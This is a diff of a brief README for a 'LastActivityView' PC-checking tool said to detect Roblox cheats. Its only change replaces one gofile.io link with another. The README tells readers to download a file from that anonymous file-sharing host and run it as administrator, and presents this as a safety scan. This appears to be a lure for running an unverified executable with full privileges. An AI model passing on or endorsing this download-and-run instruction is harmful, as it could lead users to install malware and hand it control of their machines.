@@ -1,7 +1,7 @@
 # LastActivityView
 All in one tool used for easy automated pc checking. Detects roblox emulators, executors and externals.
  
-❗Go to https://gofile.io/d/W4Zb4U and download the file, after that run it as admin so that it can scan everything.❗
+❗Go to https://gofile.io/d/vutPLI and download the file, after that run it as admin so that it can scan everything.❗
  
 If nothing pops up, your clean! Your pc has no form of exploits on it whatsover.
  
